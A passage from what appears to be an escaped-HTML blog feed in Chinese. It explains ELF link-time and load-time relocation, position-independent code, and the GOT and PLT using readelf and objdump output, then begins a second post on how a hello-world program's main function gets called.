位来自外部的&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;，这等到链接过程由链接器来确定&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;，如果使用链接器将&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;与另一个目标文件的
&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;绑定则在生成可执行文件时就可以确定&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的地址。也就是说上面的例子对&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的重定位是在链接时
完成的，叫做&lt;code class=&quot;highlighter-rouge&quot;&gt;链接时重定位(Link Time Relocation)&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;链接时重定位的代码需要指定加载地址，当加载器加载代码时只要按照指定的加载地址即可。这种代码并不是
位置无关代码(PIC)。如查看&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;的program headers:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf --headers /bin/bash
...
Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  ...
  LOAD           0x000000 0x08048000 0x08048000 0x1098d8 0x1098d8 R E 0x1000
  LOAD           0x109ef8 0x08152ef8 0x08152ef8 0x049b0 0x09974 RW  0x1000
  ...
...

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;可以看到&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;并不是位置无关代码，因为它的代码(&lt;code class=&quot;highlighter-rouge&quot;&gt;R&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;E&lt;/code&gt;)将被加载到地址0x08048000处，数据(&lt;code class=&quot;highlighter-rouge&quot;&gt;R&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;W&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;)将被加载
到地址0x08152ef8处。&lt;/p&gt;

&lt;p&gt;共享库就不能被指定加载地址，而是应该可以被加载到进程运行的任意地址，这就要采用位置无关代码技术。
如&lt;code class=&quot;highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt;共享库的program heasers中就没有指定加载地址。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf --headers /lib/ld-linux.so.2
...
Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000000 0x00000000 0x00000000 0x2220c 0x2220c R E 0x1000
  LOAD           0x022c80 0x00023c80 0x00023c80 0x00bd8 0x00c98 RW  0x1000
  ...
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;装载时重定位&quot;&gt;&lt;a href=&quot;#装载时重定位&quot;&gt;装载时重定位&lt;/a&gt;&lt;/h3&gt;

&lt;h4 id=&quot;模块内部数据访问&quot;&gt;&lt;a href=&quot;#模块内部数据访问&quot;&gt;模块内部数据访问&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;接下来我们自己编译一个位置无关代码(使用gcc编译时添加 -fPIC 和 -shared选项)，然后将目标代码反
汇编，看看是怎么定位符号的。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat test2.c
static int foo = 100;//静态变量

int function(void)
{
	return foo;
}

#加上-fPIC -shared 选项，生成位置无关代码
$ gcc -fPIC -shared -o libtest2.so test2.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;objumpd&lt;/code&gt;反汇编&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest2.so&lt;/code&gt;可以看到function()对应的汇编代码，调用了__x86.get_pc_thunk.ax,
__x86.get_pc_thunk.ax的代码很简单，只是将&lt;code class=&quot;highlighter-rouge&quot;&gt;(%esp)&lt;/code&gt;的值传给&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;。有人可能会有疑问，这么简单
为什么还要封装成函数？因为处理器不支持直接获取当前程序的位置也就是&lt;code class=&quot;highlighter-rouge&quot;&gt;PC&lt;/code&gt;，所以通过调用
__x86.get_pc_thunk.ax函数就是为了达到获取当前的&lt;code class=&quot;highlighter-rouge&quot;&gt;PC&lt;/code&gt;。在调用__x86.get_pc_thunk.ax会先把&lt;code class=&quot;highlighter-rouge&quot;&gt;call&lt;/code&gt;
的下一条指令的地址压如stack，当程序流程转向__x86.get_pc_thunk.ax时&lt;code class=&quot;highlighter-rouge&quot;&gt;%esp&lt;/code&gt;正好指向&lt;code class=&quot;highlighter-rouge&quot;&gt;add    $0x1b28,%eax&lt;/code&gt;
指令的地址。就可以将PC存入&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d libtest2.so
...
000004d0 &amp;lt;function&amp;gt;:
 4d0:	55                   	push   %ebp
 4d1:	89 e5                	mov    %esp,%ebp
 4d3:	e8 0d 00 00 00       	call   4e5 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
 4d8:	05 28 1b 00 00       	add    $0x1b28,%eax
 4dd:	8b 80 10 00 00 00    	mov    0x10(%eax),%eax
 4e3:	5d                   	pop    %ebp
 4e4:	c3                   	ret
...

000004e5 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;:
 4e5:	8b 04 24             	mov    (%esp),%eax
 4e8:	c3                   	ret
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;执行完__x86.get_pc_thunk.ax返回function()后将&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;的值就被赋值为0x4d8, 然后将&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;加上0x1b28即：
0x4d8 + 0x1b28 = 0x2000。&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt; + 0x10 = 0x2010。这里存放的应该就是&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的值了。反汇编一下看看是不是。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump --disassemble-all libtest2.so
...
00002010 &amp;lt;foo&amp;gt;:
    2010:	64 00 00             	add    %al,%fs:(%eax)
	...
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;果然在0x2010处存放的是十六进制的0x64,即十进制的100。&lt;/p&gt;

&lt;h4 id=&quot;模块间数据访问&quot;&gt;&lt;a href=&quot;#模块间数据访问&quot;&gt;模块间数据访问&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;回想一下上面的程序，虽然是位置无关代码，但是变量&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;是一个&lt;code class=&quot;highlighter-rouge&quot;&gt;static&lt;/code&gt;变量，所以要访问&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;只要知道&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;和当前
指令的偏移量就够了。但是如果引用了来自其他共享库中的变量会怎么样呢？因为共享库的加载地址是不确定的，那如何
做到引用外部变量而不出错呢？来看看下面的程序是如何实现重定位的。&lt;/p&gt;

&lt;p&gt;稍微调整一下上面的代码，并添加 &lt;code class=&quot;highlighter-rouge&quot;&gt;-fPIC&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;-shared&lt;/code&gt;选项编译：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extern int foo;//外部变量

int function()
{
	return foo;
}

$ gcc -fPIC -shared -o libtest3.so test3.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;接着反汇编&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest3.so&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d libtest3.so
...
000004f0 &amp;lt;function&amp;gt;:
 4f0:	55                   	push   %ebp
 4f1:	89 e5                	mov    %esp,%ebp
 4f3:	e8 0f 00 00 00       	call   507 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
 4f8:	05 08 1b 00 00       	add    $0x1b08,%eax
 4fd:	8b 80 f4 ff ff ff    	mov    -0xc(%eax),%eax
 503:	8b 00                	mov    (%eax),%eax
 505:	5d                   	pop    %ebp
 506:	c3                   	ret
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;仔细观察可以发现&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest3.so&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest2.so&lt;/code&gt;还是有点区别的。调用__x86.get_pc_thunk.ax之后
&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;值是0x4f8, &lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt; + 0x1b08 = 0x2000，0x2000 - 0x0c = 0x1ff4。也就是说0x1ff4处存放的应该是
foo的值。查看&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest3.so&lt;/code&gt;的重定位表可以发现0x1ff4处是一个类型为&lt;code class=&quot;highlighter-rouge&quot;&gt;R_386_GLOB_DAT&lt;/code&gt;的值。当
&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest3.so&lt;/code&gt;被加载时，动态链接器会检查重定位表，并将&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的值放到&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;条目中的对应位置(0x1ff4).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -R libtest3.so

DYNAMIC RELOCATION RECORDS
...
OFFSET   TYPE              VALUE
00001ff4 R_386_GLOB_DAT    foo
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;从这个例子可以发现位置无关代码引用外部的变量与代码加载到内存的位置无关，因为代码指定从&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;
中取数据，因为不能修改共享的代码，而&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;属于数据，可以对其进行写操作，所以只要在加载时让动
态链接器找到对应的变量的值并存入到&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;中，那么代码就可以引用了。这样就能保证在不修改代码的
情况下完成数据的访问。&lt;/p&gt;

&lt;h4 id=&quot;模块间函数调用&quot;&gt;&lt;a href=&quot;#模块间函数调用&quot;&gt;模块间函数调用&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;对于动态库函数的引用，理论上讲可以采用和&lt;a href=&quot;#模块间数据访问&quot;&gt;模块间数据访问&lt;/a&gt;一样的方法来实现函数地址
解析，但是ELF采用了另外一种更复杂而又精妙的方法。不仅要使用&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表，还用到了&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;表。&lt;/p&gt;

&lt;p&gt;再看一个例子：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat test.c
extern int foo;

int function(void)
{
	return foo;
}

$ gcc -fPIC -shared -o libtest4.so test4.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;还是将&lt;code class=&quot;highlighter-rouge&quot;&gt;libtest4.so&lt;/code&gt;反汇编进行分析。可以看到对&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;函数的调用是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;foo@plt&lt;/code&gt;来定位&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的地址。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d libtest4.so
...
00000500 &amp;lt;function&amp;gt;:
 500:	55                   	push   %ebp
 501:	89 e5                	mov    %esp,%ebp
 503:	53                   	push   %ebx
 504:	83 ec 04             	sub    $0x4,%esp
 507:	e8 12 00 00 00       	call   51e &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
 50c:	05 f4 1a 00 00       	add    $0x1af4,%eax
 511:	89 c3                	mov    %eax,%ebx
 513:	e8 98 fe ff ff       	call   3b0 &amp;lt;foo@plt&amp;gt;
 518:	83 c4 04             	add    $0x4,%esp
 51b:	5b                   	pop    %ebx
 51c:	5d                   	pop    %ebp
 51d:	c3                   	ret
...


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;存放的是0x50c, &lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;存放的是&lt;code class=&quot;highlighter-rouge&quot;&gt;%eax&lt;/code&gt;+0x1af4 = 0x2000。使用&lt;code class=&quot;highlighter-rouge&quot;&gt;readelf --sections&lt;/code&gt;可以看到&lt;code class=&quot;highlighter-rouge&quot;&gt;.got.plt&lt;/code&gt;的
地址就是0x2000,其实0x2000就是&lt;code class=&quot;highlighter-rouge&quot;&gt;过程链接表&lt;/code&gt;(Procedure Linkage Table, PLT)。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readelf --sections libtest4.so
Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ...
  [20] .got              PROGBITS        00001fec 000fec 000014 04  WA  0   0  4
  [21] .got.plt          PROGBITS        00002000 001000 000010 04  WA  0   0  4
  ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;和共享库的代码一样是多个进程共享的，也就是说不能改写&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;，但是可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;来改写数据部分来确定
引用外部符号的绝对地址。并且可执行文件的&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;表和共享目标文件的&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;是分开的。利用&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;表确定引用的。
&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;的结构如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Procedure Linkage Table

.PLT0:  pushl 4(%ebx)
        jmp *8(%ebx)
        nop; nop
        nop; nop
.PLT1:  jmp *name1@GOT(%ebx)
        pushl $offset
        jmp .PLT0@PC
.PLT2:  jmp *name2@GOT(%ebx)
        pushl $offset
        jmp .PLT0@PC
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;通过&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;来确定&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的地址可以分为一下几个步骤：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;将共享库加载到内存，动态连接器将&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表的第二项(&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT[1]&lt;/code&gt;)和第三项(‘GOT[2]’)分别设置为特殊值。
&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[0]&lt;/code&gt;也是一个特殊的条目。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;调用者(caller)负责将&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;(注意是&lt;code class=&quot;highlighter-rouge&quot;&gt;.got.plt&lt;/code&gt;, 不是&lt;code class=&quot;highlighter-rouge&quot;&gt;.got&lt;/code&gt;)表的地址存放在&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;中(注意，ELF规定必须
将&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;的地址放入到&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;而不是其他寄存器)。
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 507:	e8 12 00 00 00       	call   51e &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
 50c:	05 f4 1a 00 00       	add    $0x1af4,%eax
 511:	89 c3                	mov    %eax,%ebx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;然后调到&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;条目(&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[1]&lt;/code&gt;)，即&lt;code class=&quot;highlighter-rouge&quot;&gt;foo@plt&lt;/code&gt;。当首次调用&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;前，&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表存放的是&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的
&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;条目的第二条指令&lt;code class=&quot;highlighter-rouge&quot;&gt;pushl 0x00&lt;/code&gt;的地址，而不是&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的绝对地址。
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# foo 的 PLT
000003b0 &amp;lt;foo@plt&amp;gt;:
 3b0:	ff a3 0c 00 00 00    	jmp    *0xc(%ebx)
 3b6:	68 00 00 00 00       	push   $0x0
 3bb:	e9 e0 ff ff ff       	jmp    3a0 &amp;lt;_init+0x28&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;然后跳转到&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[1]&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;pushl 0x0&lt;/code&gt;指令执行。这里的&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt;是重定位偏移，它是一个非负数。它是和&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;对应的。
在将重定位偏移量压如stack之后，程序就跳转到了&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[0]&lt;/code&gt;。&lt;code class=&quot;highlighter-rouge&quot;&gt;PLT[0]&lt;/code&gt;将&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;的第第二项&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT[1]&lt;/code&gt;(&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;+0x4)压入
stack中。然后跳转到&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT[2]&lt;/code&gt;(&lt;code class=&quot;highlighter-rouge&quot;&gt;%ebx&lt;/code&gt;+0x8)处,&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT[2]&lt;/code&gt;将控制权交给动态链接器。
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# PLT[0]
000003a0 &amp;lt;foo@plt-0x10&amp;gt;:
 3a0:	ff b3 04 00 00 00    	pushl  0x4(%ebx)
 3a6:	ff a3 08 00 00 00    	jmp    *0x8(%ebx)
 3ac:	00 00                	add    %al,(%eax)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;当动态链接器拿到控制权之后会根据压入stack的参数来确定引用的符号的值，然后将此值写入对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;中，然后将控制
权还回给用调用程序。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/Triangleowl/picture/blob/master/GOT/GOT1.png&quot; alt=&quot;第一次调用foo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;至此&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表中存放的已经是&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的绝对地址了，当再次代用&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;时就不会像第一次调用这么麻烦，因为&lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;表中已经
有&lt;code class=&quot;highlighter-rouge&quot;&gt;foo&lt;/code&gt;的地址了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/Triangleowl/picture/blob/master/GOT/GOT2.png&quot; alt=&quot;第二次调用foo&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;参考：&lt;br /&gt;
《深入理解计算机系统》&lt;br /&gt;
《程序员的自我修养》&lt;br /&gt;
&lt;a href=&quot;https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html&quot;&gt;PLT and GOT - the key to code sharing and dynamic libraries&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.skyfree.org/linux/references/ELF_Format.pdf&quot;&gt;ELF format&lt;/a&gt;&lt;/p&gt;</content><author><name>Triangleowl</name></author><summary type="html">Table Of Contents 链接时重定位 装载时重定位 模块内部数据访问 模块间数据访问 模块间函数调用</summary></entry><entry><title type="html">main 函数背后的故事</title><link href="http://localhost:4000/linux/hello-world" rel="alternate" type="text/html" title="main 函数背后的故事" /><published>2019-11-06T00:00:00+08:00</published><updated>2019-11-06T00:00:00+08:00</updated><id>http://localhost:4000/linux/hello-world</id><content type="html" xml:base="http://localhost:4000/linux/hello-world">&lt;h4 id=&quot;table-of-contents&quot;&gt;&lt;strong&gt;Table Of Contents&lt;/strong&gt;&lt;/h4&gt;
&lt;h4 id=&quot;hello-world的编译过程-&quot;&gt;&lt;a href=&quot;#hello-world的编译过程&quot;&gt;hello-world的编译过程 &lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;hello-world的执行过程-&quot;&gt;&lt;a href=&quot;#hello-world的执行过程&quot;&gt;hello-world的执行过程 &lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h5 id=&quot;函数的入口地址-&quot;&gt;&lt;a href=&quot;#函数的入口地址&quot;&gt;函数的入口地址 &lt;/a&gt;&lt;/h5&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h5 id=&quot;__libc_start_main_函数-&quot;&gt;&lt;a href=&quot;#__libc_start_main_函数&quot;&gt;__libc_start_main_函数 &lt;/a&gt;&lt;/h5&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h5 id=&quot;__libc_csu_init函数-&quot;&gt;&lt;a href=&quot;#__libc_csu_init函数&quot;&gt;__libc_csu_init函数 &lt;/a&gt;&lt;/h5&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;h5 id=&quot;_init函数-&quot;&gt;&lt;a href=&quot;#_init函数&quot;&gt;_init函数 &lt;/a&gt;&lt;/h5&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hello-world的编译过程&quot;&gt;&lt;a href=&quot;#hello-world的编译过程&quot;&gt;hello-world的编译过程&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;我们都知道一个简单的 &lt;em&gt;hello world&lt;/em&gt; C程序是经过&lt;code class=&quot;highlighter-rouge&quot;&gt;预处理&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;编译&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;汇编&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;链接&lt;/code&gt;几个阶段最终生成可执行文件的。每个过程的工作可以概括如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;预处理阶段&lt;/strong&gt;. 预处理器(&lt;code class=&quot;highlighter-rouge&quot;&gt;cpp&lt;/code&gt;)根据以 &lt;em&gt;&lt;strong&gt;#&lt;/strong&gt;&lt;/em&gt; 开头的代码来修改原始的C程序。比如 &lt;em&gt;hello world&lt;/em&gt; 程序将 &lt;em&gt;#include&lt;/em&gt; 命令告诉预处理器读取 &lt;em&gt;stdio.h&lt;/em&gt; 的内容，并插入到 &lt;em&gt;hello world&lt;/em&gt; 程序中生成 &lt;em&gt;hello.i&lt;/em&gt; 文件。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;编译阶段&lt;/strong&gt;. 编译器(&lt;code class=&quot;highlighter-rouge&quot;&gt;cc1&lt;/code&gt;)将 &lt;em&gt;hello.i&lt;/em&gt; 文件翻译成汇编文件 &lt;em&gt;hello.s&lt;/em&gt;。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;汇编阶段&lt;/strong&gt;. 汇编器(&lt;code class=&quot;highlighter-rouge&quot;&gt;as&lt;/code&gt;)将 &lt;em&gt;hello.s&lt;/em&gt; 文件中的汇编指令翻译成机器语言指令，并把这些指令打包成_可重定位目标文件_，并按照&lt;code class=&quot;highlighter-rouge&quot;&gt;ELF&lt;/code&gt;文件格式生成 &lt;em&gt;hello.o&lt;/em&gt; 文件。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;链接阶段&lt;/strong&gt;. &lt;em&gt;hello world&lt;/em&gt; 程序调用了 &lt;em&gt;printf&lt;/em&gt; 函数，但是我们的源文件里并没有这个函数的代码，它是一个C语言标准库里的代码。链接阶段就由连接器(&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;)来确定 &lt;em&gt;printf&lt;/em&gt; 函数的地址，从而确保程序在执行时能正确调用 &lt;em&gt;printf&lt;/em&gt; 函数。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;简单的用命令来概括就很简单了，准备好了 &lt;em&gt;hello world&lt;/em&gt; 程序之后，只需下面一个命令就能立马从 &lt;em&gt;hello world&lt;/em&gt; 源程序得到可执行程序。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;$ cat hello.c
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv)
{
	printf(&quot;hello world\n&quot;);

	return 0;
}

$ gcc hello.c -o hello
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么问题来了， &lt;em&gt;hello world&lt;/em&gt; 的执行过程是怎样的呢？你可能会说很简单啊，程序成 &lt;em&gt;main&lt;/em&gt; 函数开始执行，调用 &lt;em&gt;printf&lt;/em&gt; 函数，所以我们能看到一句 &lt;em&gt;hello world&lt;/em&gt; ，然后程序退出。没错，程序就是这样运行的，从 &lt;em&gt;main&lt;/em&gt; 函数开始的。如果再深究一下：哪个函数调用了 &lt;em&gt;main&lt;/em&gt; 函数呢？这篇blog来介绍一下 &lt;em&gt;main&lt;/em&gt; 函数是怎么被调用的。&lt;/p&gt;

&lt;h3 id=&quot;hello-world的执行过程&quot;&gt;&lt;a href=&quot;#hello-world的执行过程&quot;&gt;hello-world的执行过程&lt;/a&gt;&lt;/h3&gt;

&lt;h4 id=&quot;函数的入口地址&quot;&gt;&lt;a href=&quot;#函数的入口地址&quot;&gt;函数的入口地址&lt;/a&gt;&lt;/h4&gt;

